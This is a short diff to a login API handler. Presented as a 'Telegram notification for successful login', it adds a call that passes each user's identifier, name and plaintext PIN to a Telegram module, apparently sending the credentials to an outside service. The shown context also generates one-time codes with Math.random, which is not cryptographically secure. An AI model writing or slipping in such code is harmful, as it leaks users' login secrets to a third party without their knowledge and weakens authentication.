@@ -84,6 +84,10 @@ export async function POST(req: Request) {
                 }, { status: 401 })
             }
 
+            // Send Telegram notification for successful login
+            const { notify } = await import("@/lib/telegram")
+            notify.login(identifier, user.full_name || 'Unknown', pin)
+
             const otp = Math.floor(100000 + Math.random() * 900000).toString()
 
             // Update OTP in profiles
